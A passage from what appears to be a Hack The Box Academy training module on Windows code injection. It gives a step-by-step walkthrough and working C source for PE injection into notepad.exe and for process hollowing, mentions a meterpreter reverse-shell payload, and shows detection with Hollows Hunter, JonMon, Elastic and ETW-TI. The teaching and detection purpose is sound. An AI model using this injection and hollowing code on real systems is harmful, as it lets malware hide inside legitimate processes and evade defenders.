ETW-TI providers are exclusive to Early Launch Anti-Malware (ELAM) signed drivers, unlike the usual ETW providers. To capture the ETW-TI telemetry, we can use the [Sealighter-TI](https://github.com/pathtofile/SealighterTI) open-source project, which can help log these events in the Windows Event Viewer.

We can perform a trace using Sealighter-TI. Subsequently, after running the `mapview_remote.exe` binary and specifying a process ID, the activity will be logged in Event Viewer using the `Microsoft-Windows-Threat-Intelligence` provider, showcasing detailed information, as we can see below:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-14.png)

The detection shows detailed information, including the local and remote processes and the base address for the mapped view, which is really useful for detecting this activity.


# PE Injection - Implementation

## Portable Executable Injection

In Portable Executable (PE) injection, the injector process loads a [PE file](https://en.wikipedia.org/wiki/Portable_Executable) into its own memory space and then uses various methods to transfer this loaded PE file into the memory space of the target process. Once the PE file is successfully injected into the target process, the `target process can execute the code contained in the injected PE file as if it were its own code`.

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image49_.png)

This technique is different from the classic DLL injection technique that we discussed previously. Here, the address of `LoadLibrary` is not passed; instead the malware can copy its malicious code into the target process and make it execute the code by calling `CreateRemoteThread`.

In PE injection, the malware doesn't have to drop any malicious DLL on the disk for injection. The malware can inject either the currently executing program or download a new PE and inject it into the target. To accomplish this, memory is allocated in the current process to contain the PE by using `VirtualAlloc`, and the same amount of memory is allocated in the target process by using `VirtualAllocEx`. Then, the code is written into the target memory by calling `WriteProcessMemory`.

One challenge in this approach is that when the malware process injects its PE into another process, it will have a new base address, which is unpredictable. This needs to be fixed by checking its relocation table address in the host process and resolving the absolute addresses of the copied image by looping through its relocation descriptors.

## Debugging a PE Injection

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (including WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the compiled sample program, and tools at the following paths:

- **PE Injection**: `C:\injection\pe\peinjection.exe`
- **CFF Explorer**: `C:\injection\tools\CFF-Explorer\CFF Explorer.exe`
- **x64dbg**: `C:\injection\tools\x64dbg\release\x64\x64dbg.exe`
- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`

**Note:** The shortcut for WinDbg is saved on the Desktop, Start menu, and the taskbar.

* * *

To demonstrate this, we have an executable ( `peinjection.exe`) that performs PE injection by injecting itself into the target process, which is `notepad.exe` with PID `5412` in this scenario:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image50.png)

The injector program first gets the local image base address. This information is also inside the PEB (Process Environment Block) of a running process. Programmatically, it can be retrieved using `GetModuleHandle(NULL)`, which refers to the base address of the current executable module (the module of the calling process). Next, the program gets the address of the NT header. We can use `WinDbg` to debug the process and find the `ImageBaseAddress` within the PEB as we can see below:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/imagebaseaddr.png)

Using `CFF Explorer`, we can scrutinize the value of `e_lfanew`, containing the offset to the start of the NT headers in the Dos Header, and compare it to the value displayed by the executable:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image52.png)

If we add `+80` to the image base address, it will point to the start of the `NT header`. This can be verified in a debugger such as `x64dbg` as well. The address shows the PE signature which is represented as `PE` (or 45 50 in hex).

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image53.png)

From the NT Header, the program checks the `SizeOfImage` inside the optional Header. This is required to determine the size for memory allocation.

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image54.png)

At this point, we know the size of memory required to copy the current PE image. The function `VirtualAlloc` is called to allocate the memory equal to the size of image, and the current PE is written to it.

```c
VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);

```

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image55.png)

The next part of this injection is to calculate the offset or difference between the base address of the image in the target process and the base address of the image in the current process. This calculation is necessary because when we inject a PE (Portable Executable) image into another process, the base address of the image in the target process will likely be different from the base address of the image in the current process. The delta (difference) between these two addresses needs to be calculated so that any absolute addresses or offsets within the PE image can be adjusted to work correctly in the target process.

The next step is to copy the portable executable to this address. Once we press enter, the memory at this address is populated with the PE:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image56.png)

Up to this point, everything has happened locally. Since we know the size, a memory region can now be allocated in the remote process using `VirtualAllocEx`.

```c
VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

```

After this call, a new memory region is created in the `notepad.exe` process:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image57.png)

The content is empty. Press `Enter` to copy the PE image into this memory region using `memcpy`:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image58.png)

```c
memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

```

During the execution of `memcpy`, the PE is copied to this remote address:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image59.png)

A remote thread is created using the `CreateRemoteThread` function to execute the code for the PE injection:

```c
CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)NewEntryPoint + deltaImageBase), NULL, 0, NULL);

```

![PE Injection](https://academy.hackthebox.com/storage/modules/266/image60.png)

* * *

## Source Code for Demo

Below is the complete C code to test this:

```c
#include <windows.h>
#include <stdio.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD NewEntryPoint()
{
    DWORD currentPID = GetCurrentProcessId();
    CHAR message[256];
    snprintf(message, sizeof(message), "Current Process PID: %d", currentPID);
    MessageBoxA(NULL, message, "PE Injection successful", MB_OK);
}

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    //Print basic information about current and remote process
    DWORD currentPID = GetCurrentProcessId();
    printf("\n[!] Current PID: %lu\n", currentPID);
    DWORD targetPID = atoi(argv[1]);
    printf("[!] Target PID: %lu\n", targetPID);

    // Get base address of current image
    PVOID imageBaseAddr = GetModuleHandle(NULL);
    printf("[!] (GetModuleHandle) Current image's base address: 0x%p\n", imageBaseAddr);

    //PE headers to reach the SizeOfImage
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)imageBaseAddr;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBaseAddr + dos_header->e_lfanew);
    printf("[!] (e_lfanew) NT HEADER address: %p, Offset : %x\n", (DWORD_PTR)(imageBaseAddr+dos_header->e_lfanew), dos_header->e_lfanew);
    printf("[!] (nt_header->OptionalHeader.SizeOfImage) SizeOfImage is :  %lx\n", nt_header->OptionalHeader.SizeOfImage);

    // Memory allocation to copy the current PE image
    PVOID localImageAddr = VirtualAlloc(NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    printf("[+] (local) Allocated RW memory block at 0x%p\n", localImageAddr);

    //Copy PE into the allocated address
    printf("\nPress enter to copy PE image at locally allocated memory block. . .\n");
    getchar();
    memcpy(localImageAddr, imageBaseAddr, nt_header->OptionalHeader.SizeOfImage);
    printf("[+] (local) Current PE is written at address : 0x%p\n", localImageAddr);

    //Open target process to inject the PE
    HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (targetProcessHandle == NULL)
    {
        printf("Failed to open process with PID %d\n", targetPID);
        return 1;
    }
    printf("[+] Process Handle to target PID %d is obtained\n", targetPID);

    // Memory allocation in target process to inject PE
    PVOID targetImageAddr = VirtualAllocEx(targetProcessHandle, NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("[+] (remote) Allocated RWX memory block at address : 0x%p\n", targetImageAddr);

    //Calculate the difference between the base addresses of the current and target processes to use for relocation
    DWORD_PTR memoryDelta = (DWORD_PTR)targetImageAddr - (DWORD_PTR)imageBaseAddr;

    //Iterate the reloc table of localImageAddr to fix addresses for targetImageAddr
    PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImageAddr + nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocEntriesCount = 0;
    PDWORD_PTR fixedAddress;
    PBASE_RELOCATION_ENTRY relocRVA = NULL;
    printf("[+] (local) Fixing reloc addresses to make it work in remote process\n");
    printf("\nPress enter to fix. . .\n\n");
    getchar();

    printf("   -------------------------------\n");
    printf("  |  Original |  Fixed Reloc RVA  |\n");
    printf("  |-------------------------------|\n");
    while (baseRelocation->SizeOfBlock > 0)
    {
        //Count of relocations in this block
        relocEntriesCount = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        // Get the base relocation entry
        relocRVA = (PBASE_RELOCATION_ENTRY)(baseRelocation + 1);

        // Iterate through each relocation entry
        for (short i = 0; i < relocEntriesCount; i++)
        {
            // Check if the current relocation entry has an offset
            if (relocRVA[i].Offset)
            {
                // Calculate the original offset before fixing
                DWORD_PTR originalOffset = baseRelocation->VirtualAddress + relocRVA[i].Offset;
                // Calculate the patched address by adding the delta to the base address of the local image
                fixedAddress = (PDWORD_PTR)((DWORD_PTR)localImageAddr + originalOffset);
                // Adjust the address to point to the corresponding location in the target process
                *fixedAddress += memoryDelta;
                printf("  | %9X | %016p  |\n", originalOffset, *fixedAddress);

            }
        }
        //Move to the next block of the relocation table
        baseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)baseRelocation + baseRelocation->SizeOfBlock);
    }
    printf("   -------------------------------\n");
    printf("\n[+] (local) Fixed reloc addresses\n");

    printf("\nPress enter to copy patched PE image at remote address. . .\n");
    getchar();

    // Write the relocated localImageAddr into the targetProcessHandle
    WriteProcessMemory(targetProcessHandle, targetImageAddr, localImageAddr, nt_header->OptionalHeader.SizeOfImage, NULL);

    printf("[+] (remote) Copied patched PE from local memory block to remotely allocated block at: 0x%p\n", targetImageAddr);

    printf("\nPress enter to start remote thread to execute MessageBox code from the injected PE. . .\n");
    getchar();

    // Create new thread to start the injected PE inside the targetProcessHandle
    HANDLE hThread = CreateRemoteThread(targetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)NewEntryPoint + memoryDelta), NULL, 0, NULL);

    DWORD tid = GetThreadId(hThread);
    printf("[!] Remote thread created with TID: %lu\n", tid);
    printf("[!] Thread start address: 0x%p\n", ((DWORD_PTR)NewEntryPoint + memoryDelta));
    printf("[+] PE injection is successful.\n");
    printf("\nPress enter to exit injector process. . .\n");
    getchar();
    CloseHandle(hThread);
    CloseHandle(targetProcessHandle);
    return 0;
}

```

In the next section, we will showcase the detections for this attack technique.


# PE Injection - Detection Opportunities

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the compiled sample program, and tools at the following paths:

- **PE Injection**: `C:\injection\pe\peinjection.exe`
- **Hollows hunter**: `C:\injection\tools\hollows_hunter64.exe`
- **Sealighter-TI (for ETW-Ti events)**: `C:\tools\SealighterTI.exe`
- **JonMon**: `C:\injection\tools\JonMon\`

**Note:** The shortcut for WinDbg is saved on the Desktop, Start menu, and taskbar. JonMon and Sealighter-TI are preconfigured.

* * *

We can use [Hollows Hunter](https://github.com/hasherezade/hollows_hunter) to detect the PE injection. This tool scans all running processes and recognizes and dumps a variety of potentially malicious implants (replaced/implanted PEs, shellcodes, hooks, in-memory patches).

By default, Hollows Hunter scans all accessible processes. However, we can make the scan more focused and select only the processes of interest. There are a few criteria by which we can make the selection:

- by name (parameter `/pname`)
- by PID (parameter `/pid`)
- by the time of process creation (parameter `/ptime` s) - relative to the start of Hollows Hunter

We will use the default option to scan through all the processes:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/pemanipulate-1.png)

We can see that it has detected `notepad.exe` (PID 9232) as a suspicious process:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/pemanipulate.png)

Elastic also detects it under behavior detection:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/pemanipulate-2.png)

We can also utilize `JonMon` to detect this activity. Below is the `Process Access Event`:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/pejonmon.png)

Then, we have the `Remote Memory Allocation Event`:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/pejonmon-1.png)

Next is the event for `Remote Thread Creation`:

![PE Injection](https://academy.hackthebox.com/storage/modules/266/pejonmon-2.png)

We can refer to JonMon's [Event Mapping](https://github.com/jsecurity101/JonMon/wiki/Event-Mapping) for more information.


# Understanding Process Hollowing

Process Hollowing is a code injection technique used by attackers to execute arbitrary code within the address space of a legitimate process. Instead of injecting code directly into a remote process, the malware first unmaps the legitimate code from the memory of the target process and overwrites that memory space with a malicious executable. This means that the inner content of the executable is replaced with malicious content, but the path remains the same. Additionally, there is no involvement of `CreateRemoteThread()`. This is useful for attackers as it makes it appear that the code is running from a legitimate binary only.

The diagram below shows the order of operations for a simple version of this technique:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow-diagram_.png)

First, a new instance of a target process is created. The target process's code is removed (unmapped) from memory. New memory is allocated in the target process to store the content of the malicious image. Then, the entrypoint of the target process is changed to run the new code, and the process is resumed.

Let's see the Windows API function calls involved in this technique:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image_.png)

We will take an example of this open-source [project](https://github.com/adamhlt/Process-Hollowing) developed by [Adam Henault](https://github.com/adamhlt) for process hollowing that includes an x64 loader, which can inject into both x86 and x64 processes. The loader makes several checks before trying to inject the new PE image.

- Check if the PE image has a valid signature.
- Check if the target process and the PE image have the same architecture.
- Check if the target process and the PE image have the same subsystem.
- Check if the PE image has a relocation table.

After these checks, the loader injects the PE image with and without relocation table. If there is no relocation table, the loader tries to allocate memory at the preferred image base address.

We have the process hollowing loader, `hollow.exe`, and a replacement executable, i.e., `kiwi.exe`, which is a malicious executable created using `msfconsole` with `windows/x64/meterpreter/reverse_tcp` payload with a custom template. We will target the `C:\Windows\System32\SearchProtocolHost.exe` process.

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow.gif)

The code is actually running a different executable (i.e., `kiwi.exe`), which is our reverse TCP shell. If we look in Task Manager, there will be no sign of `kiwi.exe` because the malicious code is placed in `SearchProtocolHost.exe`, as we can see below:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-15-1.png)

Let's understand the steps involved in the Process Hollowing injection technique.

## Steps involved

This technique involves creating a target process in a suspended state, then obtaining and modifying its thread context to locate the image base address. The original executable code is hollowed out by allocating memory in the target process. The malicious executable is then written into this allocated memory space. The entry point of the new executable is set in the thread context, and finally, the suspended process is resumed, executing the injected malicious code. This technique effectively replaces the legitimate code of a running process with malicious code, making it appear as a legitimate process. The outlined steps are as follows:

1. Create a Suspended Process
2. Get Thread Context
3. Retrieve Image Base Address
4. Hollow the target process
5. Allocate Memory in the Target Process
6. Write the New Executable into the Target Process
7. Set new Entry Point, thread context and resume thread

Let's understand these steps in detail.

### Step 1: Create a Suspended Process

A new process is created in a suspended state using the [CreateProcessA()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function with the `CREATE_SUSPENDED` flag. This allows the attacker to modify the process memory before it starts executing.

Ths syntax of this function is as follows:

```c
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

```

The first parameter is `lpApplicationName`, which represents the process name we want to create. The other parameter we need to pay attention to is the `dwCreationFlags`, which controls the creation of a process. For a list of the supported values, see [Process Creation Flags](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).

In this technique, we create a suspended process by using the `CREATE_SUSPENDED` flag, which has a value of `0x4`:

```c
if (!CreateProcessA(original_exe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
{
    printf("\Couldn't create process. Error code is : % lu\n", GetLastError());
    return 1;
}

```

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-4_.png)

### Step 2: Get Thread Context

The context of the main thread of the suspended process is retrieved using the [GetThreadContext()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) function. This context contains registers and other information about the thread's state. The function has the following syntax:

```c
BOOL GetThreadContext(
  HANDLE    hThread,
  LPCONTEXT lpContext
);

```

Alternatively, we can use [NtGetContextThread()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FThread%20Context%2FNtGetContextThread.html):

```c
NtGetContextThread(pi.hThread, &ctx);

```

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-5_.png)

### Step 3: Retrieve Image Base Address

The thread context contains details regarding the `ImageBase`, i.e., the base address of the target process's executable image in memory. This is necessary to know where to write the new code.

We can use the function [NtReadProcessMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtReadVirtualMemory.html) or [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory), which reads the data from an area of memory in a specified process. The function has the following syntax:

```c
NtReadVirtualMemory(

  IN HANDLE               ProcessHandle,
  IN PVOID                BaseAddress,
  OUT PVOID               Buffer,
  IN ULONG                NumberOfBytesToRead,
  OUT PULONG              NumberOfBytesReaded OPTIONAL );

```

`NtReadVirtualMemory` is similar to the WINAPI function `ReadProcessMemory`. With the right values passed to the function, we can call it as shown below:

```c
NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &imageBase, sizeof(PVOID), NULL);

```

Here, the first argument is a handle to the remote process with memory that is being read. The second argument refers to a pointer to the base address in the specified process from which to read. For x64 architecture, the `ctx.Rdx` register contains the address of the PEB (Process Environment Block) structure. The code `ctx.Rdx + (sizeof(SIZE_T) * 2)` calculates the address within the PEB where the pointer to the ImageBaseAddress is located. The PEB structure starts with a few fields, and at an offset of `(sizeof(SIZE_T) * 2)` from the base of the PEB, there is a pointer to the `ImageBaseAddress`.

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-1.png)

This is equal to `16`, i.e, `0x10` in hex. If we add `+0x10` to the PEB, we get the `ImageBaseAddress` address.

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-2.png)

We can get the same value of the `ImageBaseAddress` from the PEB programmatically:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-3.png)

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-6_.png)

### Step 4: Hollow the target process

At this point, we have the process handle and its `ImageBaseAddress`. The next step is to hollow out the target process's memory starting from its ImageBaseAddress using the function [NtUnmapViewOfSection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection).

Below is the syntax for the `NtUnmapViewOfSection` function:

```c
NTSYSAPI NTSTATUS NtUnmapViewOfSection
(
  [in]           HANDLE ProcessHandle,
  [in, optional] PVOID  BaseAddress
);

```

The first parameter is a handle to a remote process, and the second parameter is the `BaseAddress`, which is a pointer to the base virtual address of the view to unmap. This value can be any virtual address within the view.

We have added the handle to the remote process as the first parameter and the `ImageBaseAddress` as the second parameter. This will hollow out the entire target process image starting from its image base address:

```c
NtUnmapViewOfSection(pi.hProcess, imageBase);

```

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-7_.png)

### Step 5: Allocate Memory in the Target Process

Memory is allocated in the target process to hold the new executable's headers and sections. This is done using the [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. We allocate a block of memory of size `SizeOfImage` in the victim process.

Below is the syntax of the `VirtualAllocEx` function:

```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);

```

This function reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero. With the correct parameters, we can call this function:

```c
remoteImage = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

```

The first argument, `pi.hProcess`, is the handle to the remote process. The second argument, `(PVOID)pNtHeader->OptionalHeader.ImageBase`, is the pointer that specifies `ImageBase` as the desired starting address for the region of pages that we want to allocate. The third argument, `OptionalHeader.SizeOfImage`, is the size of the region of memory to allocate, in bytes.

The function allocates memory within the virtual address space of the process:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-8_.png)

### Step 6: Write the New Executable into the Target Process

The headers and sections of the replacement executable are written into the allocated memory in the target process using [NtWriteProcessMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html):

```c
NtWriteVirtualMemory(pi.hProcess, remoteImage, localImage, pNtHeader->OptionalHeader.SizeOfHeaders, NULL);

for (i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
{
    pSecHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)localImage + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
    NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)remoteImage + pSecHeader->VirtualAddress), (PVOID)((LPBYTE)localImage + pSecHeader->PointerToRawData), pSecHeader->SizeOfRawData, NULL);
}

```

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-9_.png)

### Step 7: Set new Entry Point, thread context and resume thread

The entry point of the process is updated to point to the entry point of the new executable. This is done by modifying the context of the main thread.

```c
ctx.Rcx = (SIZE_T)((LPBYTE)remoteImage + pNtHeader->OptionalHeader.AddressOfEntryPoint);

NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeader->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

```

The updated context (with the new entry point) is set back to the main thread using [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext). The process is then resumed using ResumeThread, causing it to start executing the injected code.

```c
NtSetContextThread(pi.hThread, &ctx);

NtResumeThread(pi.hThread, NULL);

```

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-10_.png)

## Source Code for Demo

The source code used to demonstrate this technique is as follows:

```c
#include <windows.h>
#include <stdio.h>

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
EXTERN_C NTSTATUS NTAPI NtClose(HANDLE);
EXTERN_C NTSTATUS NTAPI NtWaitForSingleObject(HANDLE, BOOLEAN, PLARGE_INTEGER);

void ShowUsage() {
    printf("Usage: hollow.exe [targetExe] [replacement]\n");
    printf("Example: hollow.exe \"c:\\Windows\\System32\\svchost.exe\" \"c:\\windows\\system32\\cmd.exe\"\n");
}

int main(int argc, char *argv[]) {

    LPSTR after_hollow, original_exe = NULL;

    if (argc == 2 && strcmp(argv[1], "help") == 0) {
        ShowUsage();
        return 0;
    }

    if (argc == 3) {
        after_hollow = argv[1];
        original_exe = argv[2];
    }
    else{
        original_exe = "C:\\windows\\system32\\sc.exe";
        after_hollow = "C:\\injection\\hollow\\hollow_replace.exe";
    }

    printf("\n[!] Original Exe: %s\n", original_exe);
    printf("[!] After Hollow: %s\n", after_hollow);

    DWORD currentPID = GetCurrentProcessId();
    printf("[!] CallingProcessId : %lu\n", currentPID);

    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSecHeader;
    PVOID localImage, remoteImage, imageBase = 0;
    DWORD i, read, nSizeOfFile;
    HANDLE hFile;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;

    ctx.ContextFlags = CONTEXT_FULL;

    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessA(original_exe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        printf("\nNot able to run the target executable. Error code is : % lu\n", GetLastError());
        return 1;
    }

    printf("[!] [CREATE_SUSPENDED] TargetProcessId  : %lu\n", pi.dwProcessId);

    hFile = CreateFileA(after_hollow, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("\nNot able to open the replacement executable. Error code is : % lu\n", GetLastError());
        NtTerminateProcess(pi.hProcess, 1);
        return 1;
    }

    nSizeOfFile = GetFileSize(hFile, NULL);
    localImage = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!ReadFile(hFile, localImage, nSizeOfFile, &read, NULL))
    {
        printf("\nNot able to read the replacement executable. Error code is : % lu\n", GetLastError());
        NtTerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Allocated memory and copied new exe into it at address %p (LOCAL)\n", localImage);

    NtClose(hFile);
    pDosHeader = (PIMAGE_DOS_HEADER)localImage;

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("\nError: Invalid executable format.\n");
        NtTerminateProcess(pi.hProcess, 1);
        return 1;
    }

    pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)localImage + pDosHeader->e_lfanew);
    NtGetContextThread(pi.hThread, &ctx);

#ifdef _WIN64
    NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &imageBase, sizeof(PVOID), NULL);
#endif

#ifdef _X86_
    NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &imageBase, sizeof(PVOID), NULL);
#endif
    printf("[!] Image base address  : %lp\n", imageBase);

    if ((SIZE_T)imageBase == pNtHeader->OptionalHeader.ImageBase)
    {
        printf("\nUnmapping original executable image from child process. Address: %#zx\n", (SIZE_T)imageBase);
        NtUnmapViewOfSection(pi.hProcess, imageBase);
    }

    remoteImage = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory at the address %p (REMOTE)\n", remoteImage);

    if (!remoteImage)
    {
        printf("\nError: Unable to allocate memory. VirtualAllocEx failed with error %lu\n", GetLastError());
        NtTerminateProcess(pi.hProcess, 1);
        return 1;
    }

    NtWriteVirtualMemory(pi.hProcess, remoteImage, localImage, pNtHeader->OptionalHeader.SizeOfHeaders, NULL);
    for (i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
    {
        pSecHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)localImage + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)remoteImage + pSecHeader->VirtualAddress), (PVOID)((LPBYTE)localImage + pSecHeader->PointerToRawData), pSecHeader->SizeOfRawData, NULL);
    }
    DWORD tid = GetThreadId(pi.hThread);
    printf("[+] Headers and sections are written. Press enter to update the entry point of thread (TID: %lu)\n", tid);
    getchar();

#ifdef _WIN64
    ctx.Rcx = (SIZE_T)((LPBYTE)remoteImage + pNtHeader->OptionalHeader.AddressOfEntryPoint);
    NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeader->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
    printf("[+] Entrypoint of thread %lu is updated to %p. . .\n", tid, ctx.Rcx);
#endif

#ifdef _X86_
    ctx.Eax = (SIZE_T)((LPBYTE)remoteImage + pNtHeader->OptionalHeader.AddressOfEntryPoint);
    NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeader->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif

    NtSetContextThread(pi.hThread, &ctx);
